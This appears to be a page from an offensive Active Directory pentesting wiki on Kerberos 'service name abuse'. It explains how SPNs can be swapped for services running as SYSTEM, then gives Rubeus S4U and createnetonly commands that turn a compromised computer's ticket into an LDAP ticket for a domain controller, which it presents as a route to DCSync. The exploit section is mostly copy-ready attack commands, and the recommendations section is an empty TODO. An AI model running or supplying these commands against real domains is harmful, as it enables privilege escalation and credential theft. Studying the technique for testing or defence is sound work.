---
layout: default
title: Service Name Abuse
parent: Active Directory
nav_order: 1
permalink: /ad/servicename/
---

# Service Name Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

To understand this attack, you must consider a few things about Kerberos protocol:
* Service tickets (TGS) are encrypted with the the service's symetric key.
* This key is derived from the password hash of the principal running the service (often `NT AUTHORITY\SYSTEM`).
* SPN has no impact in the process, **it even can be changed**.
* Microsoft says everything is fine with that...

Considering that, and the fact that most services on a Windows computer are running as SYSTEM, most of the TGS are encrypted with the same symetric key. You can then request TGS for other SPN as long as the expected symetric key is the same.

## Prerequisites

* Having compromised a domain computer running a service.

## Exploit

```powershell
./Rubeus.exe s4u /impersonateuser:$username /msdsspn:$service/$target /altservice:$anotherservice /user:$hostname$ /ticket:$TGTBase64EncodedTicket /nowrap

# For example, let's request a TGS for LDAP service on the domain controller instead of CIFS.
./Rubeus.exe s4u /impersonateuser:$username /msdsspn:cifs/$dc /altservice:ldap /user:$computer$ /ticket:$TGTBase64EncodedTicket /nowrap

# Don't forget to pass the ticket to a new session.
 ./Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$domain /username:$username /password:$FakePassword /ticket:$TGSBase64EncodedTicket
```

Now you have a TGS for LDAP service on the Domain Controller, you can - *for example* - perform a [DCSync attack](/ad/dcsync/).

## Useful links

* TODO: List links here.

## Recommendations

- [ ] TODO: List recommendations here.